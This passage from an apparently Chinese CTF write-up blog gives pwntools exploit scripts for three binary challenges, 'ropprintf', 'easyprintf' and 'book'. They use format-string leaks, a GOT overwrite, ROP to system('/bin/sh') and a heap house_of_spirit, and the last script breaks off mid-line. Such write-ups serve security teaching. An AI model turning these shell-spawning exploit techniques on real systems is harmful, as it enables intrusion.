class=\"line\">40</div><div class=\"line\">41</div><div class=\"line\">42</div><div class=\"line\">43</div><div class=\"line\">44</div><div class=\"line\">45</div></pre></td><td class=\"code\"><pre><div class=\"line\">#!/usr/bin/env <span class=\"keyword\">python</span></div><div class=\"line\"># coding=utf-<span class=\"number\">8</span></div><div class=\"line\">from pwn import *</div><div class=\"line\"></div><div class=\"line\">slog = <span class=\"number\">1</span></div><div class=\"line\">local = <span class=\"number\">1</span></div><div class=\"line\"><span class=\"keyword\">debug</span> = <span class=\"number\">0</span></div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">if</span> slo<span class=\"variable\">g:</span> context(log_level = <span class=\"string\">'debug'</span>, terminal = [<span class=\"string\">'tmux'</span>, <span class=\"string\">'splitw'</span>, <span class=\"string\">'-h'</span>])</div><div class=\"line\"><span class=\"keyword\">if</span> loca<span class=\"variable\">l:</span></div><div class=\"line\">    <span class=\"keyword\">p</span> = process(<span class=\"string\">'./ropprintf'</span>)</div><div class=\"line\">    libc = ELF(<span class=\"string\">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</div><div class=\"line\"><span class=\"keyword\">else</span>:</div><div class=\"line\">    <span class=\"keyword\">p</span> = remote(<span class=\"string\">'172.16.1.1'</span>, <span class=\"number\">20000</span>)</div><div class=\"line\">    libc = ELF(<span class=\"string\">'./libc.so.6'</span>)</div><div class=\"line\"></div><div class=\"line\">#if local <span class=\"built_in\">and</span> debu<span class=\"variable\">g:</span></div><div class=\"line\">#    gdb.attach(<span class=\"keyword\">p</span>, <span class=\"keyword\">open</span>(<span class=\"string\">'debug'</span>))</div><div class=\"line\"></div><div class=\"line\">elf = ELF(<span class=\"string\">'./ropprintf'</span>)</div><div class=\"line\"></div><div class=\"line\">offset = <span class=\"number\">22</span></div><div class=\"line\"></div><div class=\"line\">printf_got = elf.got[<span class=\"string\">'printf'</span>]</div><div class=\"line\"></div><div class=\"line\">payload1 = <span class=\"string\">'%11$lx'</span></div><div class=\"line\">pop_ret = <span class=\"number\">0</span>x0000000000400703 # <span class=\"keyword\">pop</span> rdi, <span class=\"keyword\">ret</span></div><div class=\"line\"><span class=\"keyword\">p</span>.recvuntil(<span class=\"string\">'something\\n'</span>)</div><div class=\"line\">gdb.attach(<span class=\"keyword\">p</span>)</div><div class=\"line\"><span class=\"keyword\">p</span>.sendline(payload1)</div><div class=\"line\">libc_start_main_addr = <span class=\"keyword\">int</span>(<span class=\"keyword\">p</span>.recvline(), <span class=\"number\">16</span>)</div><div class=\"line\"><span class=\"keyword\">print</span> <span class=\"string\">'libc_start =&gt; '</span>, hex(libc_start_main_addr)</div><div class=\"line\"></div><div class=\"line\">libc.address = libc_start_main_addr - <span class=\"number\">240</span> - libc.symbols[<span class=\"string\">'__libc_start_main'</span>]</div><div class=\"line\">system_addr = libc.symbols[<span class=\"string\">'system'</span>]</div><div class=\"line\"><span class=\"keyword\">print</span> <span class=\"string\">'system_addr =&gt; '</span>, hex(system_addr)</div><div class=\"line\">binsh_addr = libc.<span class=\"built_in\">search</span>(<span class=\"string\">'/bin/sh'</span>).<span class=\"keyword\">next</span>()</div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">for</span> i in <span class=\"built_in\">range</span>(<span class=\"number\">8</span>):</div><div class=\"line\">    <span class=\"keyword\">p</span>.recvuntil(<span class=\"string\">'something\\n'</span>)</div><div class=\"line\">    <span class=\"keyword\">p</span>.sendline(<span class=\"string\">'1'</span>)</div><div class=\"line\"># gdb.attach(<span class=\"keyword\">p</span>)</div><div class=\"line\">payload2 = <span class=\"string\">'a'</span> * offset + p64(pop_ret) + p64(binsh_addr) + p64(system_addr)</div><div class=\"line\"><span class=\"keyword\">p</span>.sendline(payload2)</div><div class=\"line\"><span class=\"keyword\">p</span>.interactive()</div></pre></td></tr></table></figure>\n<h2 id=\"easyprintf\"><a href=\"#easyprintf\" class=\"headerlink\" title=\"easyprintf\"></a>easyprintf</h2><p>最直接的fsb。程序开了<code>PIE</code>，可以通过直接打印得到<code>elf.address</code>和<code>libc.address</code>。由于传参方式不一样，所以能用传统的方式去写，这里我是用的<code>UAF</code>，因为我们可以控制栈上的内容，所以可以提前将想要写入的地址布置在栈上，然后再用fsb的<code>hhn</code>和<code>hn</code>分字节去修改。</p>\n<figure class=\"highlight perl\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div><div class=\"line\">26</div><div class=\"line\">27</div><div class=\"line\">28</div><div class=\"line\">29</div><div class=\"line\">30</div><div class=\"line\">31</div><div class=\"line\">32</div><div class=\"line\">33</div><div class=\"line\">34</div><div class=\"line\">35</div><div class=\"line\">36</div><div class=\"line\">37</div><div class=\"line\">38</div><div class=\"line\">39</div><div class=\"line\">40</div><div class=\"line\">41</div><div class=\"line\">42</div><div class=\"line\">43</div><div class=\"line\">44</div><div class=\"line\">45</div><div class=\"line\">46</div><div class=\"line\">47</div><div class=\"line\">48</div><div class=\"line\">49</div><div class=\"line\">50</div><div class=\"line\">51</div><div class=\"line\">52</div><div class=\"line\">53</div><div class=\"line\">54</div><div class=\"line\">55</div><div class=\"line\">56</div><div class=\"line\">57</div><div class=\"line\">58</div><div class=\"line\">59</div><div class=\"line\">60</div><div class=\"line\">61</div><div class=\"line\">62</div><div class=\"line\">63</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"comment\">#!/usr/bin/env python</span></div><div class=\"line\"><span class=\"comment\"># coding=utf-8</span></div><div class=\"line\">from pwn import *</div><div class=\"line\"></div><div class=\"line\">slog = <span class=\"number\">1</span></div><div class=\"line\"><span class=\"keyword\">local</span> = <span class=\"number\">1</span></div><div class=\"line\">debug = <span class=\"number\">0</span></div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">if</span> slog: context(log_level = <span class=\"string\">'debug'</span>, terminal = [<span class=\"string\">'tmux'</span>,<span class=\"string\">'splitw'</span>, <span class=\"string\">'-h'</span>])</div><div class=\"line\"><span class=\"keyword\">if</span> <span class=\"keyword\">local</span>:</div><div class=\"line\">    p = process(<span class=\"string\">'./easyprintf'</span>)</div><div class=\"line\"><span class=\"keyword\">else</span>:</div><div class=\"line\">    p = remote()</div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">if</span> <span class=\"keyword\">local</span> <span class=\"keyword\">and</span> debug:</div><div class=\"line\">    gdb.attach(p)</div><div class=\"line\"></div><div class=\"line\">elf = ELF(<span class=\"string\">'./easyprintf'</span>)</div><div class=\"line\">libc = ELF(<span class=\"string\">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</div><div class=\"line\"></div><div class=\"line\"><span class=\"comment\"># leak libc_base &amp; elf_base</span></div><div class=\"line\">payload1 = <span class=\"string\">'%9$lx-%38$lx'</span></div><div class=\"line\">p.recvuntil(<span class=\"string\">'something\\n'</span>)</div><div class=\"line\"><span class=\"comment\"># gdb.attach(p)</span></div><div class=\"line\">p.sendline(payload1)</div><div class=\"line\">addr = p.recvline()[:-<span class=\"number\">1</span>].<span class=\"keyword\">split</span>(<span class=\"string\">'-'</span>)</div><div class=\"line\">libc.address = <span class=\"keyword\">int</span>(addr[<span class=\"number\">0</span>], <span class=\"number\">16</span>) - <span class=\"number\">0x18ba47</span></div><div class=\"line\">elf.address = <span class=\"keyword\">int</span>(addr[<span class=\"number\">1</span>], <span class=\"number\">16</span>) - <span class=\"number\">0x8d0</span></div><div class=\"line\"><span class=\"keyword\">print</span> <span class=\"string\">'elf_base =&gt; '</span>, <span class=\"keyword\">hex</span>(elf.address)</div><div class=\"line\"><span class=\"keyword\">print</span> <span class=\"string\">'libc_address =&gt; '</span>, <span class=\"keyword\">hex</span>(libc.address)</div><div class=\"line\">system_addr = libc.symbols[<span class=\"string\">'system'</span>]</div><div class=\"line\">binsh_addr = libc.search(<span class=\"string\">'/bin/sh'</span>).next()</div><div class=\"line\"><span class=\"keyword\">print</span> <span class=\"string\">'system_addr =&gt; '</span>, <span class=\"keyword\">hex</span>(system_addr)</div><div class=\"line\"><span class=\"keyword\">print</span> <span class=\"string\">'binsh_addr =&gt; '</span>, <span class=\"keyword\">hex</span>(binsh_addr)</div><div class=\"line\">printf_addr = <span class=\"keyword\">hex</span>(libc.symbols[<span class=\"string\">'printf'</span>])</div><div class=\"line\"><span class=\"keyword\">print</span> <span class=\"string\">'printf_addr =&gt; '</span>, printf_addr</div><div class=\"line\"></div><div class=\"line\"><span class=\"comment\"># UAF</span></div><div class=\"line\">printf_got = elf.got[<span class=\"string\">'printf'</span>]</div><div class=\"line\"><span class=\"keyword\">print</span> <span class=\"string\">'printf_got =&gt; '</span>, <span class=\"keyword\">hex</span>(printf_got)</div><div class=\"line\"><span class=\"comment\"># gdb.attach(p)</span></div><div class=\"line\">payload2 = <span class=\"string\">'a'</span> * (<span class=\"number\">0x100</span> - <span class=\"number\">0x10</span>) + p64(printf_got + <span class=\"number\">0x2</span>)  + p64(printf_got)</div><div class=\"line\"><span class=\"keyword\">print</span> payload2</div><div class=\"line\">p.recvuntil(<span class=\"string\">'something\\n'</span>)</div><div class=\"line\"><span class=\"comment\"># gdb.attach(p)</span></div><div class=\"line\">p.sendline(payload2)</div><div class=\"line\"></div><div class=\"line\"><span class=\"comment\"># edit printf_got to system_addr</span></div><div class=\"line\">offset = <span class=\"keyword\">int</span>(printf_addr[-<span class=\"number\">6</span>:-<span class=\"number\">4</span>], <span class=\"number\">16</span>) - <span class=\"number\">1</span></div><div class=\"line\"><span class=\"keyword\">print</span> <span class=\"keyword\">hex</span>(offset)</div><div class=\"line\">offset1 = <span class=\"keyword\">int</span>(<span class=\"keyword\">hex</span>(system_addr - libc.address)[<span class=\"number\">4</span>:], <span class=\"number\">16</span>) + <span class=\"keyword\">int</span>(str(printf_addr)[-<span class=\"number\">4</span>] + <span class=\"string\">'000'</span>, <span class=\"number\">16</span>)</div><div class=\"line\"><span class=\"keyword\">print</span> <span class=\"keyword\">hex</span>(offset1)</div><div class=\"line\"><span class=\"comment\"># gdb.attach(p)</span></div><div class=\"line\">payload3 = <span class=\"string\">'%&#123;&#125;x'</span>.format(offset) + <span class=\"string\">'%36$hhn'</span></div><div class=\"line\">payload3 += <span class=\"string\">'%&#123;&#125;x'</span>.format(offset1 - offset) + <span class=\"string\">'%37$hn'</span></div><div class=\"line\"><span class=\"comment\"># payload3 = '%37$lx'</span></div><div class=\"line\">p.recvuntil(<span class=\"string\">'something\\n'</span>)</div><div class=\"line\">p.sendline(payload3)</div><div class=\"line\"></div><div class=\"line\"><span class=\"comment\"># getshell</span></div><div class=\"line\">p.recvuntil(<span class=\"string\">'something\\n'</span>)</div><div class=\"line\">p.sendline(<span class=\"string\">'/bin/sh\\x00'</span>)</div><div class=\"line\">p.interactive()</div></pre></td></tr></table></figure>\n<h2 id=\"book\"><a href=\"#book\" class=\"headerlink\" title=\"book\"></a>book</h2><p>一个简单的堆的题目。由于程序在每次<code>add()</code>时候都会申请一个相应大小的<code>fastbin</code>和<code>smallbin</code>，释放时<code>fastbin</code>放到对应链表中，<code>smallbin</code>放到<code>unsortbin</code>链表中。其中<code>feedback()</code>没有检查堆的长度，修改可造成堆溢出。</p>\n<p><code>feedback()</code><br><figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div><div class=\"line\">26</div><div class=\"line\">27</div></pre></td><td class=\"code\"><pre><div class=\"line\">_<span class=\"function\">BYTE *<span class=\"title\">feedback</span><span class=\"params\">()</span></span></div><div class=\"line\">&#123;</div><div class=\"line\">  _BYTE *result; <span class=\"comment\">// rax@7</span></div><div class=\"line\">  <span class=\"keyword\">unsigned</span> <span class=\"keyword\">int</span> v1; <span class=\"comment\">// [sp+8h] [bp-8h]@1</span></div><div class=\"line\">  <span class=\"keyword\">unsigned</span> <span class=\"keyword\">int</span> i; <span class=\"comment\">// [sp+Ch] [bp-4h]@1</span></div><div class=\"line\"></div><div class=\"line\">  v1 = <span class=\"number\">0</span>;</div><div class=\"line\">  <span class=\"keyword\">for</span> ( i = <span class=\"number\">0</span>; (<span class=\"keyword\">signed</span> <span class=\"keyword\">int</span>)i &lt;= <span class=\"number\">3</span>; ++i )</div><div class=\"line\">  &#123;</div><div class=\"line\">    <span class=\"keyword\">if</span> ( auther_name_array[<span class=\"number\">5</span> * (<span class=\"keyword\">signed</span> <span class=\"keyword\">int</span>)i] &amp;&amp; feedback_array[<span class=\"number\">5</span> * (<span class=\"keyword\">signed</span> <span class=\"keyword\">int</span>)i] )</div><div class=\"line\">      <span class=\"built_in\">printf</span>(<span class=\"string\">\"feedback of book%d is %s\\n\"</span>, i, feedback_array[<span class=\"number\">5</span> * (<span class=\"keyword\">signed</span> <span class=\"keyword\">int</span>)i]);</div><div class=\"line\">  &#125;</div><div class=\"line\">  <span class=\"built_in\">puts</span>(<span class=\"string\">\"Which book do you want to modify the feedback?\"</span>);</div><div class=\"line\">  __isoc99_scanf(<span class=\"string\">\"%d\"</span>, &amp;v1);</div><div class=\"line\">  result = (_BYTE *)v1;</div><div class=\"line\">  <span class=\"keyword\">if</span> ( (v1 &amp; <span class=\"number\">0x80000000</span>) == <span class=\"number\">0</span> )</div><div class=\"line\">  &#123;</div><div class=\"line\">    result = (_BYTE *)v1;</div><div class=\"line\">    <span class=\"keyword\">if</span> ( (<span class=\"keyword\">signed</span> <span class=\"keyword\">int</span>)v1 &lt;= <span class=\"number\">3</span> )</div><div class=\"line\">    &#123;</div><div class=\"line\">      result = (_BYTE *)feedback_array[<span class=\"number\">5</span> * (<span class=\"keyword\">signed</span> <span class=\"keyword\">int</span>)v1];</div><div class=\"line\">      <span class=\"keyword\">if</span> ( result )</div><div class=\"line\">        result = read_feadback(feedback_array[<span class=\"number\">5</span> * (<span class=\"keyword\">signed</span> <span class=\"keyword\">int</span>)v1]);</div><div class=\"line\">    &#125;</div><div class=\"line\">  &#125;</div><div class=\"line\">  <span class=\"keyword\">return</span> result;</div><div class=\"line\">&#125;</div></pre></td></tr></table></figure></p>\n<p>这个函数不仅会造成堆溢出，还可用来泄露一些地址。<br>简单观察可以发现<code>fastbin</code>的链表可以通过堆溢出修改，也就是说我们可以使用<code>house_of_spirit</code>来分配得到一个指向bss段的chunk，然后修改<code>feedback_array[]</code>这个指针数组，并通过<code>feedback()</code>来泄露libc的地址。<br>但是还要找到一个bss上的<code>0x10,0x20,0x30...</code>的数字才能构造，事实上bss上存有<code>feedback_length[]</code>这个数组，我们可以通过<code>UAF</code>去得到一个数字即可。</p>\n<p><code>bss</code>段数据：<br><figure class=\"highlight groovy\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div><div class=\"line\">26</div><div class=\"line\">27</div><div class=\"line\">28</div><div class=\"line\">29</div><div class=\"line\">30</div><div class=\"line\">31</div><div class=\"line\">32</div><div class=\"line\">33</div><div class=\"line\">34</div><div class=\"line\">35</div></pre></td><td class=\"code\"><pre><div class=\"line\">.<span class=\"string\">bss:</span><span class=\"number\">0000000000601</span>D00 _bss            segment para <span class=\"keyword\">public</span> <span class=\"string\">'BSS'</span> use64</div><div class=\"line\">.<span class=\"string\">bss:</span><span class=\"number\">0000000000601</span>D00                 assume <span class=\"string\">cs:</span>_bss</div><div class=\"line\">.<span class=\"string\">bss:</span><span class=\"number\">0000000000601</span>D00                 ;org <span class=\"number\">601</span>D00h</div><div class=\"line\">.<span class=\"string\">bss:</span><span class=\"number\">0000000000601</span>D00                 assume <span class=\"string\">es:</span>nothing, <span class=\"string\">ss:</span>nothing, <span class=\"string\">ds:</span>_data, <span class=\"string\">fs:</span>nothing, <span class=\"string\">gs:</span>nothing</div><div class=\"line\">.<span class=\"string\">bss:</span><span class=\"number\">0000000000601</span>D00                 <span class=\"keyword\">public</span> stdin</div><div class=\"line\">.<span class=\"string\">bss:</span><span class=\"number\">0000000000601</span>D00 ; FILE *stdin</div><div class=\"line\">.<span class=\"string\">bss:</span><span class=\"number\">0000000000601</span>D00 stdin           dq ?                    ; DATA XREF: main+<span class=\"number\">17</span>\u0018r</div><div class=\"line\">.<span class=\"string\">bss:</span><span class=\"number\">0000000000601</span>D00                                         ; Copy of shared data</div><div class=\"line\">.<span class=\"string\">bss:</span><span class=\"number\">0000000000601</span>D08                 align <span class=\"number\">10</span>h</div><div class=\"line\">.<span class=\"string\">bss:</span><span class=\"number\">0000000000601</span>D10                 <span class=\"keyword\">public</span> stdout</div><div class=\"line\">.<span class=\"string\">bss:</span><span class=\"number\">0000000000601</span>D10 ; FILE *stdout</div><div class=\"line\">.<span class=\"string\">bss:</span><span class=\"number\">0000000000601</span>D10 stdout          dq ?                    ; DATA XREF: main+<span class=\"number\">35</span>\u0018r</div><div class=\"line\">.<span class=\"string\">bss:</span><span class=\"number\">0000000000601</span>D10                                         ; Copy of shared data</div><div class=\"line\">.<span class=\"string\">bss:</span><span class=\"number\">0000000000601</span>D18 byte_601D18     db ?                    ; DATA XREF: sub_400850+<span class=\"number\">9</span>\u0018r</div><div class=\"line\">.<span class=\"string\">bss:</span><span class=\"number\">0000000000601</span>D18                                         ; <span class=\"string\">sub_400850:</span>loc_4008A6\u0018w</div><div class=\"line\">.<span class=\"string\">bss:</span><span class=\"number\">0000000000601</span>D19                 align <span class=\"number\">20</span>h</div><div class=\"line\">.<span class=\"string\">bss:</span><span class=\"number\">0000000000601</span>D20 qword_601D20    dq ?                    ; DATA XREF: sub_400850+<span class=\"number\">17</span>\u0018r</div><div class=\"line\">.<span class=\"string\">bss:</span><span class=\"number\">0000000000601</span>D20                                         ; sub_400850+<span class=\"number\">3</span>C\u0018w ...</div><div class=\"line\">.<span class=\"string\">bss:</span><span class=\"number\">0000000000601</span>D28                 align <span class=\"number\">20</span>h</div><div class=\"line\">.<span class=\"string\">bss:</span><span class=\"number\">0000000000601</span>D40 ; <span class=\"keyword\">int</span> dword_601D40[]</div><div class=\"line\">.<span class=\"string\">bss:</span><span class=\"number\">0000000000601</span>D40 dword_601D40    dd ?                    ; DATA XREF: random+<span class=\"number\">115</span>\u0018r</div><div class=\"line\">.<span class=\"string\">bss:</span><span class=\"number\">0000000000601</span>D40                                         ; add+<span class=\"number\">71</span>\u0018w</div><div class=\"line\">.<span class=\"string\">bss:</span><span class=\"number\">0000000000601</span>D44                 align <span class=\"number\">8</span></div><div class=\"line\">.<span class=\"string\">bss:</span><span class=\"number\">0000000000601</span>D48 ; __int64 index_array[]</div><div class=\"line\">.<span class=\"string\">bss:</span><span class=\"number\">0000000000601</span>D48 index_array     dq ?                    ; DATA XREF: add+<span class=\"number\">9</span>A\u0018w</div><div class=\"line\">.<span class=\"string\">bss:</span><span class=\"number\">0000000000601</span>D48                                         ; exchange+C5\u0018r ...</div><div class=\"line\">.<span class=\"string\">bss:</span><span class=\"number\">0000000000601</span>D50 ; __int64 feedback_length[]</div><div class=\"line\">.<span class=\"string\">bss:</span><span class=\"number\">0000000000601</span>D50 feedback_length dq ?                    ; DATA XREF: add+<span class=\"number\">19</span>F\u0018w</div><div class=\"line\">.<span class=\"string\">bss:</span><span class=\"number\">0000000000601</span>D50                                         ; sub_400F67+BB\u0018r ...</div><div class=\"line\">.<span class=\"string\">bss:</span><span class=\"number\">0000000000601</span>D58 ; __int64 auther_name_array[]</div><div class=\"line\">.<span class=\"string\">bss:</span><span class=\"number\">0000000000601</span>D58 auther_name_array dq ?                  ; DATA XREF: add+D9\u0018w</div><div class=\"line\">.<span class=\"string\">bss:</span><span class=\"number\">0000000000601</span>D58                                         ; add+F7\u0018r ...</div><div class=\"line\">.<span class=\"string\">bss:</span><span class=\"number\">0000000000601</span>D60 ; __int64 feedback_array[]</div><div class=\"line\">.<span class=\"string\">bss:</span><span class=\"number\">0000000000601</span>D60 feedback_array  dq ?                    ; DATA XREF: random+F3\u0018r</div><div class=\"line\">.<span class=\"string\">bss:</span><span class=\"number\">0000000000601</span>D60                                         ; random+<span class=\"number\">235</span>\u0018r ...</div></pre></td></tr></table></figure></p>\n<p>所以我的思路如下：</p>\n<ol>\n<li>通过一定的堆排布，是的<code>fastbin</code>在地址上连续，使得堆溢出可以修改相邻堆块的指针。</li>\n<li>在堆排布的同时申请一个长度为<code>0x20</code>的feedback，使得<code>0x20</code>用来我们以后伪造<code>fastbin</code>并分配来用。</li>\n<li>通过堆溢出修改相邻已经<code>free</code>了的<code>fastbin</code>，修改指针使其指向我们刚才已经伪造的bss上的地址。</li>\n<li>修改<code>freeback_array[]</code>，使一个指针为<code>atoi_got</code>。</li>\n<li>再次使用<code>feedback()</code>泄露<code>atoi</code>，并计算libc得到<code>system</code>，并修改<code>atoi_got</code>为<code>system</code>。</li>\n<li>getshell</li>\n</ol>\n<p>exp：<br><figure class=\"highlight vim\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div><div class=\"line\">26</div><div class=\"line\">27</div><div class=\"line\">28</div><div class=\"line\">29</div><div class=\"line\">30</div><div class=\"line\">31</div><div class=\"line\">32</div><div class=\"line\">33</div><div class=\"line\">34</div><div class=\"line\">35</div><div class=\"line\">36</div><div class=\"line\">37</div><div class=\"line\">38</div><div class=\"line\">39</div><div class=\"line\">40</div><div class=\"line\">41</div><div class=\"line\">42</div><div class=\"line\">43</div><div class=\"line\">44</div><div class=\"line\">45</div><div class=\"line\">46</div><div class=\"line\">47</div><div class=\"line\">48</div><div class=\"line\">49</div><div class=\"line\">50</div><div class=\"line\">51</div><div class=\"line\">52</div><div class=\"line\">53</div><div class=\"line\">54</div><div class=\"line\">55</div><div class=\"line\">56</div><div class=\"line\">57</div><div class=\"line\">58</div><div class=\"line\">59</div><div class=\"line\">60</div><div class=\"line\">61</div><div class=\"line\">62</div><div class=\"line\">63</div><div class=\"line\">64</div><div class=\"line\">65</div><div class=\"line\">66</div><div class=\"line\">67</div><div class=\"line\">68</div><div class=\"line\">69</div><div class=\"line\">70</div><div class=\"line\">71</div><div class=\"line\">72</div><div class=\"line\">73</div><div class=\"line\">74</div><div class=\"line\">75</div><div class=\"line\">76</div><div class=\"line\">77</div><div class=\"line\">78</div><div class=\"line\">79</div><div class=\"line\">80</div><div class=\"line\">81</div><div class=\"line\">82</div><div class=\"line\">83</div><div class=\"line\">84</div><div class=\"line\">85</div><div class=\"line\">86</div><div class=\"line\">87</div></pre></td><td class=\"code\"><pre><div class=\"line\">#!/usr/bin/env <span class=\"keyword\">python</span></div><div class=\"line\"># coding=utf-<span class=\"number\">8</span></div><div class=\"line\">from pwn import *</div><div class=\"line\"></div><div class=\"line\">slog = <span class=\"number\">0</span></div><div class=\"line\">local = <span class=\"number\">1</span></div><div class=\"line\"><span class=\"keyword\">debug</span> = <span class=\"number\">0</span></div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">if</span> slo<span class=\"variable\">g:</span> context(log_level = <span class=\"string\">'debug'</span>)#, terminal = [<span class=\"string\">'tmux'</span>, <span class=\"string\">'splitw'</span>, <span class=\"string\">'-h'</span>])</div><div class=\"line\"><span class=\"keyword\">if</span> loca<span class=\"variable\">l:</span></div><div class=\"line\">    <span class=\"keyword\">p</span> = process(<span class=\"string\">'./book'</span>)</div><div class=\"line\"><span class=\"keyword\">else</span>:</div><div class=\"line\">    <span class=\"keyword\">p</span> = remote()</div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">if</span> local <span class=\"built_in\">and</span> debu<span class=\"variable\">g:</span></div><div class=\"line\">    gdb.attach(<span class=\"keyword\">p</span>, <span class=\"keyword\">open</span>(<span class=\"string\">'debug'</span>))</div><div class=\"line\"></div><div class=\"line\">bss = <span class=\"number\">0</span>x0000000000601D00</div><div class=\"line\">elf = ELF(<span class=\"string\">'./book'</span>)</div><div class=\"line\">libc = ELF(<span class=\"string\">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</div><div class=\"line\"></div><div class=\"line\">atoi_got = elf.got[<span class=\"string\">'atoi'</span>]</div><div class=\"line\"></div><div class=\"line\">def <span class=\"built_in\">add</span>(author, length, feedback):</div><div class=\"line\">    <span class=\"keyword\">p</span>.recvuntil(<span class=\"string\">'!!\\n'</span>)</div><div class=\"line\">    <span class=\"keyword\">p</span>.sendline(str(<span class=\"number\">2</span>))</div><div class=\"line\">    <span class=\"keyword\">p</span>.recvuntil(<span class=\"string\">'author:\\n'</span>)</div><div class=\"line\">    <span class=\"keyword\">p</span>.sendline(author)</div><div class=\"line\">    <span class=\"keyword\">p</span>.recvuntil(<span class=\"string\">'it?\\n'</span>)</div><div class=\"line\">    <span class=\"keyword\">p</span>.sendline(str(length))</div><div class=\"line\">    <span class=\"keyword\">p</span>.sendline(feedback)</div><div class=\"line\"></div><div class=\"line\">def <span class=\"keyword\">delete</span>(<span class=\"built_in\">index</span>):</div><div class=\"line\">    <span class=\"keyword\">p</span>.recvuntil(<span class=\"string\">'!!\\n'</span>)</div><div class=\"line\">    <span class=\"keyword\">p</span>.sendline(str(<span class=\"number\">3</span>))</div><div class=\"line\">    <span class=\"keyword\">p</span>.recvuntil(<span class=\"string\">'book?\\n'</span>)</div><div class=\"line\">    <span class=\"keyword\">p</span>.sendline(str(<span class=\"built_in\">index</span>))</div><div class=\"line\"></div><div class=\"line\"></div><div class=\"line\">def feedback(<span class=\"built_in\">index</span>, feedback):</div><div class=\"line\">    <span class=\"keyword\">p</span>.recvuntil(<span class=\"string\">'!!\\n'</span>)</div><div class=\"line\">    <span class=\"keyword\">p</span>.sendline(str(<span class=\"number\">4</span>))</div><div class=\"line\">    <span class=\"keyword\">p</span>.recvuntil(<span class=\"string\">'feedback?'</span>)</div><div class=\"line\">    <span class=\"keyword\">p</span>.sendline(str(<span class=\"built_in\">index</span>))</div><div class=\"line\">    <span class=\"keyword\">p</span>.sendline(feedback)</div><div class=\"line\"></div><div class=\"line\">def pwn():</div><div class=\"line\"># use UAF <span class=\"keyword\">to</span> exploit house_of_spirit </div><div class=\"line\"># UAF</div><div class=\"line\">    <span class=\"built_in\">add</span>(str(<span class=\"number\">0</span>), <span class=\"number\">0</span>x30, <span class=\"string\">'a'</span>)</div><div class=\"line\">    <span class=\"keyword\">delete</span>(<span class=\"number\">0</span>)</div><div class=\"line\">    <span class=\"built_in\">add</span>(str(<span class=\"number\">1</span>), <span class=\"number\">0</span>x20, <span class=\"string\">'b'</span>)</div><div class=\"line\">    <span class=\"keyword\">delete</span>(<span class=\"number\">0</span>)</div><div class=\"line\">    <span class=\"built_in\">add</span>(str(<span class=\"number\">2</span>), <span class=\"number\">0</span>x10, <span class=\"string\">'c'</span>)</div><div class=\"line\">    <span class=\"keyword\">delete</span>(<span class=\"number\">0</span>)</div><div class=\"line\">    <span class=\"built_in\">add</span>(str(<span class=\"number\">3</span>), <span class=\"number\">0</span>x20, <span class=\"string\">'d'</span>)  # <span class=\"built_in\">index</span> <span class=\"number\">0</span></div><div class=\"line\">    payload = <span class=\"string\">'a'</span> * <span class=\"number\">0</span>x20 + p64(<span class=\"number\">0</span>) + p64(<span class=\"number\">0</span>x21) + p64(<span class=\"number\">0</span>x601d58 - <span class=\"number\">0</span>x10)</div><div class=\"line\">    feedback(<span class=\"number\">0</span>, payload)</div><div class=\"line\">    <span class=\"built_in\">add</span>(str(<span class=\"number\">4</span>), <span class=\"number\">0</span>x10, <span class=\"string\">'e'</span>)  # <span class=\"built_in\">index</span> <span class=\"number\">2</span></div><div class=\"line\">#    gdb.attach(<span class=\"keyword\">p</span>)</div><div class=\"line\">    <span class=\"built_in\">add</span>(str(<span class=\"number\">5</span>), <span class=\"number\">0</span>x10, <span class=\"string\">'f'</span> * <span class=\"number\">0</span>x8 + 